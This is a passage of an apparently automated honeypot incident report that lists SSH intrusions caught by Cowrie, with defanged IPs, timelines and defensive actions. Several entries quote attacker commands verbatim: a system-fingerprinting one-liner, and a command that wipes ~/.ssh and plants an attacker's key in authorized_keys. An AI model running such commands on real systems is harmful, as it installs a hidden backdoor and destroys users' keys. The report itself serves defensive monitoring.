| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:28:03` | `cowrie.session.connect` |
| `2026-09-24 17:28:04` | `cowrie.client.version` |
| `2026-09-24 17:28:04` | `cowrie.client.kex` |
| `2026-09-24 17:28:05` | `cowrie.login.success` |
| `2026-09-24 17:28:06` | `cowrie.session.params` |
| `2026-09-24 17:28:06` | `cowrie.command.input` |
| `2026-09-24 17:28:06` | `cowrie.command.input` |
| `2026-09-24 17:28:06` | `cowrie.command.input` |
| `2026-09-24 17:28:06` | `cowrie.command.input` |
| `2026-09-24 17:28:06` | `cowrie.command.input` |
| `2026-09-24 17:28:06` | `cowrie.command.success` |
| `2026-09-24 17:28:06` | `cowrie.command.input` |
| `2026-09-24 17:28:06` | `cowrie.command.input` |
| `2026-09-24 17:28:06` | `cowrie.command.input` |
| `2026-09-24 17:28:06` | `cowrie.command.input` |
| `2026-09-24 17:28:07` | `cowrie.log.closed` |
| `2026-09-24 17:28:08` | `cowrie.session.params` |
| `2026-09-24 17:28:08` | `cowrie.command.input` |
| `2026-09-24 17:28:08` | `cowrie.log.closed` |
| `2026-09-24 17:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41ed5e068b30

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 17:29 |
| **Last Seen** | 2026-09-24 17:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:29:54` | `cowrie.session.connect` |
| `2026-09-24 17:29:55` | `cowrie.client.version` |
| `2026-09-24 17:29:55` | `cowrie.client.kex` |
| `2026-09-24 17:29:57` | `cowrie.login.success` |
| `2026-09-24 17:29:58` | `cowrie.session.params` |
| `2026-09-24 17:29:58` | `cowrie.command.input` |
| `2026-09-24 17:29:58` | `cowrie.command.input` |
| `2026-09-24 17:29:58` | `cowrie.command.input` |
| `2026-09-24 17:29:58` | `cowrie.command.input` |
| `2026-09-24 17:29:58` | `cowrie.command.input` |
| `2026-09-24 17:29:58` | `cowrie.command.success` |
| `2026-09-24 17:29:58` | `cowrie.command.input` |
| `2026-09-24 17:29:58` | `cowrie.command.input` |
| `2026-09-24 17:29:58` | `cowrie.command.input` |
| `2026-09-24 17:29:58` | `cowrie.command.input` |
| `2026-09-24 17:29:59` | `cowrie.log.closed` |
| `2026-09-24 17:30:01` | `cowrie.session.params` |
| `2026-09-24 17:30:01` | `cowrie.command.input` |
| `2026-09-24 17:30:01` | `cowrie.log.closed` |
| `2026-09-24 17:30:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e92aa7113a83

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 17:31 |
| **Last Seen** | 2026-09-24 17:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:31:36` | `cowrie.session.connect` |
| `2026-09-24 17:31:37` | `cowrie.client.version` |
| `2026-09-24 17:31:37` | `cowrie.client.kex` |
| `2026-09-24 17:31:38` | `cowrie.login.success` |
| `2026-09-24 17:31:40` | `cowrie.session.params` |
| `2026-09-24 17:31:40` | `cowrie.command.input` |
| `2026-09-24 17:31:40` | `cowrie.command.input` |
| `2026-09-24 17:31:40` | `cowrie.command.input` |
| `2026-09-24 17:31:40` | `cowrie.command.input` |
| `2026-09-24 17:31:40` | `cowrie.command.input` |
| `2026-09-24 17:31:40` | `cowrie.command.success` |
| `2026-09-24 17:31:40` | `cowrie.command.input` |
| `2026-09-24 17:31:40` | `cowrie.command.input` |
| `2026-09-24 17:31:40` | `cowrie.command.input` |
| `2026-09-24 17:31:40` | `cowrie.command.input` |
| `2026-09-24 17:31:40` | `cowrie.log.closed` |
| `2026-09-24 17:31:42` | `cowrie.session.params` |
| `2026-09-24 17:31:42` | `cowrie.command.input` |
| `2026-09-24 17:31:42` | `cowrie.log.closed` |
| `2026-09-24 17:31:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29643f1f6665

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]104` |
| **First Seen** | 2026-09-24 17:33 |
| **Last Seen** | 2026-09-24 17:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:33:17` | `cowrie.session.connect` |
| `2026-09-24 17:33:17` | `cowrie.client.version` |
| `2026-09-24 17:33:17` | `cowrie.client.kex` |
| `2026-09-24 17:33:18` | `cowrie.login.success` |
| `2026-09-24 17:33:19` | `cowrie.session.params` |
| `2026-09-24 17:33:19` | `cowrie.command.input` |
| `2026-09-24 17:33:19` | `cowrie.command.failed` |
| `2026-09-24 17:33:19` | `cowrie.log.closed` |
| `2026-09-24 17:33:19` | `cowrie.session.params` |
| `2026-09-24 17:33:19` | `cowrie.command.input` |
| `2026-09-24 17:33:19` | `cowrie.session.file_download` |
| `2026-09-24 17:33:19` | `cowrie.log.closed` |
| `2026-09-24 17:33:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]104` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c3e6018bbe1

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]104` |
| **First Seen** | 2026-09-24 17:33 |
| **Last Seen** | 2026-09-24 17:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:33:19` | `cowrie.session.connect` |
| `2026-09-24 17:33:19` | `cowrie.client.version` |
| `2026-09-24 17:33:20` | `cowrie.client.kex` |
| `2026-09-24 17:33:20` | `cowrie.login.success` |
| `2026-09-24 17:33:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]104` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-772250e483af

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]104` |
| **First Seen** | 2026-09-24 17:33 |
| **Last Seen** | 2026-09-24 17:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:33:20` | `cowrie.session.connect` |
| `2026-09-24 17:33:20` | `cowrie.client.version` |
| `2026-09-24 17:33:20` | `cowrie.client.kex` |
| `2026-09-24 17:33:21` | `cowrie.login.success` |
| `2026-09-24 17:33:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]104` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1c75c47bfa2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 17:33 |
| **Last Seen** | 2026-09-24 17:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:33:27` | `cowrie.session.connect` |
| `2026-09-24 17:33:27` | `cowrie.client.version` |
| `2026-09-24 17:33:27` | `cowrie.client.kex` |
| `2026-09-24 17:33:30` | `cowrie.login.success` |
| `2026-09-24 17:33:31` | `cowrie.session.params` |
| `2026-09-24 17:33:31` | `cowrie.command.input` |
| `2026-09-24 17:33:31` | `cowrie.command.input` |
| `2026-09-24 17:33:31` | `cowrie.command.input` |
| `2026-09-24 17:33:31` | `cowrie.command.input` |
| `2026-09-24 17:33:31` | `cowrie.command.input` |
| `2026-09-24 17:33:31` | `cowrie.command.success` |
| `2026-09-24 17:33:31` | `cowrie.command.input` |
| `2026-09-24 17:33:31` | `cowrie.command.input` |
| `2026-09-24 17:33:31` | `cowrie.command.input` |
| `2026-09-24 17:33:31` | `cowrie.command.input` |
| `2026-09-24 17:33:32` | `cowrie.log.closed` |
| `2026-09-24 17:33:33` | `cowrie.session.params` |
| `2026-09-24 17:33:33` | `cowrie.command.input` |
| `2026-09-24 17:33:34` | `cowrie.log.closed` |
| `2026-09-24 17:33:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f2ae33dc7fa

| Field | Detail |
|---|---|
| **Source IP** | `43.134.85[.]158` |
| **First Seen** | 2026-09-24 17:33 |
| **Last Seen** | 2026-09-24 17:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:33:35` | `cowrie.session.connect` |
| `2026-09-24 17:33:35` | `cowrie.client.version` |
| `2026-09-24 17:33:35` | `cowrie.client.kex` |
| `2026-09-24 17:33:36` | `cowrie.login.success` |
| `2026-09-24 17:33:37` | `cowrie.session.params` |
| `2026-09-24 17:33:37` | `cowrie.command.input` |
| `2026-09-24 17:33:37` | `cowrie.command.failed` |
| `2026-09-24 17:33:38` | `cowrie.log.closed` |
| `2026-09-24 17:33:39` | `cowrie.session.params` |
| `2026-09-24 17:33:39` | `cowrie.command.input` |
| `2026-09-24 17:33:39` | `cowrie.session.file_download` |
| `2026-09-24 17:33:39` | `cowrie.log.closed` |
| `2026-09-24 17:33:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.134.85[.]158` to AbuseIPDB if not already reported
- [ ] Block `43.134.85[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fd8c63f6cf0

| Field | Detail |
|---|---|
| **Source IP** | `43.134.85[.]158` |
| **First Seen** | 2026-09-24 17:33 |
| **Last Seen** | 2026-09-24 17:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:33:39` | `cowrie.session.connect` |
| `2026-09-24 17:33:39` | `cowrie.client.version` |
| `2026-09-24 17:33:39` | `cowrie.client.kex` |
| `2026-09-24 17:33:40` | `cowrie.login.success` |
| `2026-09-24 17:33:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.134.85[.]158` to AbuseIPDB if not already reported
- [ ] Block `43.134.85[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d90ba4b77d65

| Field | Detail |
|---|---|
| **Source IP** | `43.134.85[.]158` |
| **First Seen** | 2026-09-24 17:33 |
| **Last Seen** | 2026-09-24 17:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:33:41` | `cowrie.session.connect` |
| `2026-09-24 17:33:41` | `cowrie.client.version` |
| `2026-09-24 17:33:41` | `cowrie.client.kex` |
| `2026-09-24 17:33:42` | `cowrie.login.success` |
| `2026-09-24 17:33:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.134.85[.]158` to AbuseIPDB if not already reported
- [ ] Block `43.134.85[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db20de518694

| Field | Detail |
|---|---|
| **Source IP** | `200.219.200[.]16` |
| **First Seen** | 2026-09-24 17:34 |
| **Last Seen** | 2026-09-24 17:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:34:24` | `cowrie.session.connect` |
| `2026-09-24 17:34:24` | `cowrie.client.version` |
| `2026-09-24 17:34:24` | `cowrie.client.kex` |
| `2026-09-24 17:34:24` | `cowrie.login.success` |
| `2026-09-24 17:34:25` | `cowrie.session.params` |
| `2026-09-24 17:34:25` | `cowrie.command.input` |
| `2026-09-24 17:34:25` | `cowrie.command.failed` |
| `2026-09-24 17:34:25` | `cowrie.log.closed` |
| `2026-09-24 17:34:26` | `cowrie.session.params` |
| `2026-09-24 17:34:26` | `cowrie.command.input` |
| `2026-09-24 17:34:26` | `cowrie.session.file_download` |
| `2026-09-24 17:34:26` | `cowrie.log.closed` |
| `2026-09-24 17:34:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.219.200[.]16` to AbuseIPDB if not already reported
- [ ] Block `200.219.200[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c733601a6f3

| Field | Detail |
|---|---|
| **Source IP** | `200.219.200[.]16` |
| **First Seen** | 2026-09-24 17:34 |
| **Last Seen** | 2026-09-24 17:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:34:26` | `cowrie.session.connect` |
| `2026-09-24 17:34:26` | `cowrie.client.version` |
| `2026-09-24 17:34:26` | `cowrie.client.kex` |
| `2026-09-24 17:34:27` | `cowrie.login.success` |
| `2026-09-24 17:34:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.219.200[.]16` to AbuseIPDB if not already reported
- [ ] Block `200.219.200[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d4e54a004dd

| Field | Detail |
|---|---|
| **Source IP** | `200.219.200[.]16` |
| **First Seen** | 2026-09-24 17:34 |
| **Last Seen** | 2026-09-24 17:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:34:27` | `cowrie.session.connect` |
| `2026-09-24 17:34:27` | `cowrie.client.version` |
| `2026-09-24 17:34:27` | `cowrie.client.kex` |
| `2026-09-24 17:34:28` | `cowrie.login.success` |
| `2026-09-24 17:34:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.219.200[.]16` to AbuseIPDB if not already reported
- [ ] Block `200.219.200[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38440c0e3c72

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 17:35 |
| **Last Seen** | 2026-09-24 17:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:35:12` | `cowrie.session.connect` |
| `2026-09-24 17:35:12` | `cowrie.client.version` |
| `2026-09-24 17:35:12` | `cowrie.client.kex` |
| `2026-09-24 17:35:15` | `cowrie.login.success` |
| `2026-09-24 17:35:16` | `cowrie.session.params` |
| `2026-09-24 17:35:16` | `cowrie.command.input` |
| `2026-09-24 17:35:16` | `cowrie.command.input` |
| `2026-09-24 17:35:16` | `cowrie.command.input` |
| `2026-09-24 17:35:16` | `cowrie.command.input` |
| `2026-09-24 17:35:16` | `cowrie.command.input` |
| `2026-09-24 17:35:16` | `cowrie.command.success` |
| `2026-09-24 17:35:16` | `cowrie.command.input` |
| `2026-09-24 17:35:16` | `cowrie.command.input` |
| `2026-09-24 17:35:16` | `cowrie.command.input` |
| `2026-09-24 17:35:16` | `cowrie.command.input` |
| `2026-09-24 17:35:17` | `cowrie.log.closed` |
| `2026-09-24 17:35:18` | `cowrie.session.params` |
| `2026-09-24 17:35:18` | `cowrie.command.input` |
| `2026-09-24 17:35:19` | `cowrie.log.closed` |
| `2026-09-24 17:35:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2628b8708339

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 17:36 |
| **Last Seen** | 2026-09-24 17:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:36:56` | `cowrie.session.connect` |
| `2026-09-24 17:36:57` | `cowrie.client.version` |
| `2026-09-24 17:36:57` | `cowrie.client.kex` |
| `2026-09-24 17:36:58` | `cowrie.login.success` |
| `2026-09-24 17:36:59` | `cowrie.session.params` |
| `2026-09-24 17:36:59` | `cowrie.command.input` |
| `2026-09-24 17:36:59` | `cowrie.command.input` |
| `2026-09-24 17:36:59` | `cowrie.command.input` |
| `2026-09-24 17:36:59` | `cowrie.command.input` |
| `2026-09-24 17:36:59` | `cowrie.command.input` |
| `2026-09-24 17:36:59` | `cowrie.command.success` |
| `2026-09-24 17:36:59` | `cowrie.command.input` |
| `2026-09-24 17:36:59` | `cowrie.command.input` |
| `2026-09-24 17:36:59` | `cowrie.command.input` |
| `2026-09-24 17:36:59` | `cowrie.command.input` |
| `2026-09-24 17:37:00` | `cowrie.log.closed` |
| `2026-09-24 17:37:01` | `cowrie.session.params` |
| `2026-09-24 17:37:01` | `cowrie.command.input` |
| `2026-09-24 17:37:02` | `cowrie.log.closed` |
| `2026-09-24 17:37:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8df9339d65a9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 17:38 |
| **Last Seen** | 2026-09-24 17:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:38:55` | `cowrie.session.connect` |
| `2026-09-24 17:38:55` | `cowrie.client.version` |
| `2026-09-24 17:38:55` | `cowrie.client.kex` |
| `2026-09-24 17:38:56` | `cowrie.login.success` |
| `2026-09-24 17:38:57` | `cowrie.session.params` |
| `2026-09-24 17:38:57` | `cowrie.command.input` |
| `2026-09-24 17:38:57` | `cowrie.command.input` |
| `2026-09-24 17:38:57` | `cowrie.command.input` |
| `2026-09-24 17:38:57` | `cowrie.command.input` |
| `2026-09-24 17:38:57` | `cowrie.command.input` |
| `2026-09-24 17:38:57` | `cowrie.command.success` |
| `2026-09-24 17:38:57` | `cowrie.command.input` |
| `2026-09-24 17:38:57` | `cowrie.command.input` |
| `2026-09-24 17:38:57` | `cowrie.command.input` |
